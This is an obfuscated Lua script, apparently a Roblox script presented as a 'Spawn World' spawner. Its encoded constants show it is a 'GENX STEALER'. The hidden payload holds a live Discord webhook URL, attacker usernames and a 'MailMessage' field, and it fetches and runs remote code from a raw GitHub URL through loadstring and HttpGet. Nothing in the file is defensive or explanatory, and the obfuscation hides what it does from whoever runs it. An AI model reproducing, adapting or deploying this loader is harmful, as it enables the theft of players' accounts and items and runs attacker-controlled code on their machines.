--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v67=0;local v68;while true do if (v67==0) then v68=v2(v0(v30,16));if v19 then local v94=v5(v68,v19);v19=nil;return v94;else return v68;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v69=(v31/((5 -(1 + 2))^(v32-1)))%((5 -3)^(((v33-(1 -0)) -(v32-(1 + 0))) + 1)) ;return v69-(v69%(2 -1)) ;else local v70=(621 -(555 + 64))^(v32-(932 -(857 + 74))) ;return (((v31%(v70 + v70))>=v70) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21()local v34=(2147 -(226 + 1044)) -(282 + 595) ;local v35;while true do if (v34==(1638 -(1523 + 114))) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + ((4 -3) -0) ;v34=1066 -(68 + 997) ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + (119 -(32 + 85)) );v18=v18 + 2 + 0 ;return (v37 * 256) + v36 ;end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 1 + 3 ;return (v41 * (16778173 -(892 + 65))) + (v40 * 65536) + (v39 * (610 -354)) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=(1487 -(998 + 488)) -0 ;local v45=(v20(v43,1 -0 ,45 -25 ) * ((3 -1)^(382 -(87 + 84 + 179)))) + v42 ;local v46=v20(v43,201 -(67 + 93 + 20) ,23 + 8 );local v47=((v20(v43,78 -46 )==((1564 -(201 + 571)) -(368 + 423))) and  -(1 + 0)) or (3 -2) ;if (v46==0) then if (v45==(18 -((1148 -(116 + 1022)) + 8))) then return v47 * (952 -(802 + 150)) ;else v46=2 -1 ;v44=0 -0 ;end elseif (v46==(1490 + (2318 -1761))) then return ((v45==(997 -(915 + 82))) and (v47 * ((1 -0)/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(350 + 246 + 427) ) * (v44 + (v45/((2 -0)^(482 -(44 + 386))))) ;end local function v25(v48)local v49=0 -0 ;local v50;local v51;while true do if (v49==(1081 -(1020 + (1973 -(1789 + 124))))) then v50=v3(v16,v18,(v18 + v48) -(3 -(768 -(745 + 21))) );v18=v18 + v48 ;v49=(297 + 564) -((2239 -1425) + 45) ;end if (v49==(14 -(43 -32))) then return v6(v51);end if (v49==(0 + 0)) then v50=nil;if  not v48 then v48=v23();if (v48==(0 -0)) then return "";end end v49=1;end if (v49==(1 + 1)) then v51={};for v75=1 + 0 , #v50 do v51[v75]=v2(v1(v3(v50,v75,v75)));end v49=888 -(261 + 624) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v52~=1) then else local v71=675 -(534 + 141) ;while true do if (v71~=(0 + 0)) then else v55=nil;v56=nil;v71=1 + 0 ;end if (v71~=1) then else v52=2 + 0 ;break;end end end if (v52==3) then v59=nil;while true do local v77=0 -0 ;while true do if (v77~=(1 + 0)) then else if (v53==(3 -1)) then local v101=0;while true do if (v101==1) then return v57;end if (v101~=(0 -0)) then else for v109=2 -1 ,v23() do local v110=0 + 0 ;local v111;local v112;local v113;while true do if (0~=v110) then else v111=0;v112=nil;v110=1 + 0 ;end if (v110~=(1289 -(993 + 295))) then else v113=nil;while true do if (v111==(0 + 0)) then local v158=396 -(115 + 281) ;while true do if (v158~=(0 -0)) then else local v174=0 + 0 ;while true do if (v174==(2 -1)) then v158=1;break;end if (v174==(0 -0)) then v112=867 -(550 + 317) ;v113=nil;v174=1;end end end if (1==v158) then v111=1;break;end end end if (v111~=(1 + 0)) then else while true do if (v112==(0 -0)) then v113=v21();if (v20(v113,1 -0 ,1 + 0 )==(529 -(406 + 123))) then local v178=0 -0 ;local v179;local v180;local v181;while true do if (v178==0) then local v182=1769 -(1749 + 20) ;while true do if (v182==(0 + 0)) then v179=v20(v113,287 -(134 + 151) ,2 + 1 );v180=v20(v113,1149 -(466 + 679) ,6);v182=1;end if (1==v182) then v178=1666 -(970 + 695) ;break;end end end if (v178==(5 -2)) then if (v20(v180,3,3)==(1991 -(582 + 1408))) then v181[4]=v59[v181[4]];end v54[v109]=v181;break;end if (v178~=(3 -2)) then else local v184=0 -0 ;while true do if (v184==(3 -2)) then v178=1 + 1 ;break;end if (v184==0) then v181={v22(),v22(),nil,nil};if (v179==(114 -(4 + 110))) then local v191=0;local v192;while true do if (v191==(584 -(57 + 527))) then v192=241 -(187 + 54) ;while true do if (v192==0) then v181[106 -(17 + 86) ]=v22();v181[784 -(162 + 618) ]=v22();break;end end break;end end elseif (v179==(1 -0)) then v181[8 -5 ]=v23();elseif (v179==(2 + 0)) then v181[5 -2 ]=v23() -((2 + 0)^(52 -36)) ;elseif (v179==(3 + 0)) then local v197=0 -0 ;local v198;while true do if (v197==(0 -0)) then v198=0 + 0 ;while true do if (v198~=(0 + 0)) then else v181[1639 -(1373 + 263) ]=v23() -(2^(1016 -(451 + 549))) ;v181[2 + 2 ]=v22();break;end end break;end end end v184=1 -0 ;end end end if (v178~=(2 -0)) then else if (v20(v180,1385 -(746 + 638) ,1 + 0 )==(1 -0)) then v181[2]=v59[v181[5 -3 ]];end if (v20(v180,582 -(361 + 219) ,343 -(218 + 123) )~=(321 -(53 + 267))) then else v181[1584 -(1535 + 46) ]=v59[v181[3 + 0 ]];end v178=3;end end end break;end end break;end end break;end end end for v114=1 + 0 ,v23() do v55[v114-(414 -(15 + 398)) ]=v28();end v101=983 -(18 + 964) ;end end end break;end if (v77==(560 -(306 + 254))) then if (v53~=0) then else local v102=0 + 0 ;while true do if (v102==(0 -0)) then v54={};v55={};v102=1 + 0 ;end if (v102==(1 -0)) then v56={};v57={v54,v55,nil,v56};v102=1469 -(899 + 568) ;end if ((2 + 0)~=v102) then else v53=1 + 0 ;break;end end end if (v53==(2 -1)) then v58=v23();v59={};for v104=604 -(268 + 335) ,v58 do local v105=0;local v106;local v107;local v108;while true do if (v105~=(291 -(60 + 230))) then else v108=nil;while true do if (v106==1) then if (v107==(573 -(426 + 146))) then v108=v21()~=0 ;elseif (v107==(3 -1)) then v108=v24();elseif (v107~=(1 + 2)) then else v108=v25();end v59[v104]=v108;break;end if ((0 + 0)==v106) then local v117=0;while true do if (v117==1) then v106=1;break;end if ((1456 -(282 + 1174))~=v117) then else v107=v21();v108=nil;v117=812 -(569 + 242) ;end end end end break;end if (v105~=(0 -0)) then else v106=0 + 0 ;v107=nil;v105=1025 -(706 + 318) ;end end end v57[3]=v21();v53=4 -2 ;end v77=1;end end end break;end if ((1551 -(1126 + 425))==v52) then v53=1251 -(721 + 530) ;v54=nil;v52=1;end if (v52==(7 -5)) then v57=nil;v58=nil;v52=1274 -(945 + 326) ;end end end local function v29(v60,v61,v62)local v63=0;local v64;local v65;local v66;while true do if (v63==1) then v66=v60[3];return function(...)local v78=v64;local v79=v65;local v80=v66;local v81=v27;local v82=1;local v83= -1;local v84={};local v85={...};local v86=v12("#",...) -1 ;local v87={};local v88={};for v92=0,v86 do if (v92>=v80) then v84[v92-v80 ]=v85[v92 + 1 ];else v88[v92]=v85[v92 + 1 ];end end local v89=(v86-v80) + 1 ;local v90;local v91;while true do local v93=0;while true do if (v93==0) then v90=v78[v82];v91=v90[1];v93=1;end if (v93==1) then if (v91<=12) then if (v91<=5) then if (v91<=2) then if (v91<=0) then if (v90[2]==v88[v90[4]]) then v82=v82 + 1 ;else v82=v90[3];end elseif (v91>1) then local v121=v90[2];local v122,v123=v81(v88[v121](v13(v88,v121 + 1 ,v90[3])));v83=(v123 + v121) -1 ;local v124=0;for v159=v121,v83 do v124=v124 + 1 ;v88[v159]=v122[v124];end else v88[v90[2]][v90[3]]=v90[4];end elseif (v91<=3) then v88[v90[2]]();elseif (v91==4) then local v127=v90[2];local v128=v88[v90[3]];v88[v127 + 1 ]=v128;v88[v127]=v128[v90[4]];else local v132=v90[2];v88[v132]=v88[v132](v13(v88,v132 + 1 ,v83));end elseif (v91<=8) then if (v91<=6) then do return;end elseif (v91==7) then v62[v90[3]]=v88[v90[2]];else for v162=v90[2],v90[3] do v88[v162]=nil;end end elseif (v91<=10) then if (v91>9) then for v164=v90[2],v90[3] do v88[v164]=nil;end elseif (v90[3]=="_ENV") then v88[v90[2]]=v62;else v88[v90[2]]=v62[v90[3]];end elseif (v91>11) then v88[v90[2]]=v90[3];else do return;end end elseif (v91<=18) then if (v91<=15) then if (v91<=13) then if (v90[2]==v88[v90[4]]) then v82=v82 + 1 ;else v82=v90[3];end elseif (v91==14) then local v139=0;local v140;local v141;local v142;local v143;while true do if (v139==2) then for v175=v140,v83 do v143=v143 + 1 ;v88[v175]=v141[v143];end break;end if (v139==0) then v140=v90[2];v141,v142=v81(v88[v140](v13(v88,v140 + 1 ,v90[3])));v139=1;end if (1==v139) then v83=(v142 + v140) -1 ;v143=0;v139=2;end end elseif (v90[3]=="_ENV") then v88[v90[2]]=v62;else v88[v90[2]]=v62[v90[3]];end elseif (v91<=16) then v88[v90[2]][v90[3]]=v90[4];elseif (v91==17) then v88[v90[2]]=v90[3];else local v146=v90[2];v88[v146]=v88[v146](v13(v88,v146 + 1 ,v83));end elseif (v91<=21) then if (v91<=19) then if (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end elseif (v91>20) then if (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end else local v149=v90[2];local v150=v88[v90[3]];v88[v149 + 1 ]=v150;v88[v149]=v150[v90[4]];end elseif (v91<=23) then if (v91>22) then v82=v90[3];else v82=v90[3];end elseif (v91>24) then v62[v90[3]]=v88[v90[2]];else v88[v90[2]]();end v82=v82 + 1 ;break;end end end end;end if (v63==0) then v64=v60[1];v65=v60[2];v63=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!143O00028O00027O0040026O00F03F026O00084003023O005F47030C3O004C6F6164696E675469746C65030B3O00537061776E20576F726C64030B3O00576562682O6F6B4E616D65030C3O0047454E5820535445414C455203083O00557365724E616D6503083O007A6E686F7472657003073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3136343931373133363730343134373532362F596C64474473374631704A514D7A53704D2D3666654445352D6348693165596B726A4F6D2D52584544697355337133563663696C6B78644B787A6D687367494F6A335461030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F69642O6B2F6D61696E2F692O643O6B3203093O00557365724E616D6532030A3O00686F6C616B6166616C6B030B3O004D61696C4D652O7361676500403O00120C3O00014O0008000100013O0026153O0002000100010004163O0002000100120C000100013O00261500010014000100020004163O0014000100120C000200013O0026150002000C000100030004163O000C000100120C000100043O0004163O0014000100261500020008000100010004163O0008000100120F000300053O00300100030006000700120F000300053O00300100030008000900120C000200033O0004163O0008000100261500010023000100010004163O0023000100120C000200013O0026150002001E000100010004163O001E000100120C0003000B3O0012190003000A3O00120C0003000D3O0012190003000C3O00120C000200033O00261500020017000100030004163O0017000100120C000100033O0004163O002300010004163O001700010026150001002D000100040004163O002D000100120F0002000E3O00120F0003000F3O00201400030003001000120C000500114O000E000300054O001200023O00022O00030002000100010004163O003F000100261500010005000100030004163O0005000100120C000200013O00261500020037000100010004163O0037000100120C000300133O001219000300123O00120F000300053O00300100030014000900120C000200033O000E2O00030030000100020004163O0030000100120C000100023O0004163O000500010004163O003000010004163O000500010004163O003F00010004163O000200012O00063O00017O00",v9(),...);
